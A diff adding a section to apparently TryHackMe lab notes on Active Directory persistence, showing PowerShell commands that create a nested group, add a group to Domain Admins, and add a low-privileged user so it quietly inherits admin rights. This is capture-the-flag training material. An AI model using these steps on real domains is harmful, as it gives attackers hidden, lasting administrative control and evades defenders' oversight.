@@ -97,3 +97,25 @@ PS C:\Users\Administrator.ZA>Start-Service -Name ntds
 
 ### Persistence through Group Membership
 
+Nesting Our Persistence
+
+Command To Create nested group
+
+```batch
+PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
+```
+
+&#x20;Command to add group to the Domain Admins group
+
+```batch
+PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
+```
+
+Command to add low-privileged AD user to the first group we created
+
+```batch
+PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
+```
+
+### Persistence through ACL
+
